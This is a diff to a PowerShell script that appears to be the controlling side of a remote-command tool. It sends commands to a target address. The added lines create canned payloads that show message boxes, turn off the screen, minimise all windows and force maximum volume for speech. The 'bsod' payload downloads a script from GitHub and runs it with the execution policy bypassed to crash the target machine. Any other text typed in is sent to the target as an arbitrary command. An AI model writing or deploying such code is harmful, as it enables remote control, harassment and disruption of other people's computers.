@@ -57,23 +57,51 @@ function Receive {
 function Spk {
     param ([string]$text)
         $words = $text.Split(' ')
-
-        $quotedWords = foreach ($word in $words) {
-            '"{0}"' -f $word
-        }
+        $quotedWords = foreach ($word in $words) {'"{0}"' -f $word}
         $joinedWords = $quotedWords -join '+'
 
     $a = '$s = new-object -com wscript.shell;1..100 | % {$s.SendKeys([char]175)};start-sleep 0.5;Add-Type -AssemblyName System.Speech;$ss = New-Object System.Speech.Synthesis.SpeechSynthesizer;$ss.Speak(replace)'
     $a = $a -replace "replace", $joinedWords
     return $a
 }
+function msg {
+    param ([string]$text)
+        $words = $text.Split(' ')
+        $quotedWords = foreach ($word in $words) {'"{0}"' -f $word}
+        $joinedWords = $quotedWords -join '+'
 
+    $a = '[System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms");[System.Windows.Forms.MessageBox]::Show(replace)'
+    $a = $a -replace "replace", $joinedWords
+    return $a
+}
+$scrnOff = @"
+(Add-Type '[DllImport("user32.dll")]public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);' -Name a -Pas)::SendMessage(-1,0x0112,0xF170,2)
+"@
+$min = @"
+(New-Object -ComObject Shell.Application).MinimizeAll()
+"@
+$bsod = @"
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ryanshaut/Enter-BSOD/master/Enter-BSOD.ps1' -OutFile "$env:temp\b.ps1";Powershell -ExecutionPolicy Bypass -File "$env:temp\b.ps1"
+"@
 
 while (1) {
     $inp = Read-Host "Send"
-    if ($inp -eq "Speak") {
+    if ($inp -eq "speak") {
         $spk = Read-Host "What do you want to say?"
         Send $sendip (Spk $spk)
+    }
+    elseif ($inp -eq "msg") {
+        $msg = Read-Host "What do you want to msg?"
+        Send $sendip (msg $msg)
+    }
+    elseif ($inp -eq "off") {
+        Send $sendip $scrnOff
+    }
+    elseif ($inp -eq "min") {
+        Send $sendip $min
+    }
+    elseif ($inp -eq "bsod") {
+        Send $sendip $bsod
     }
     else {
         Send $sendip $inp
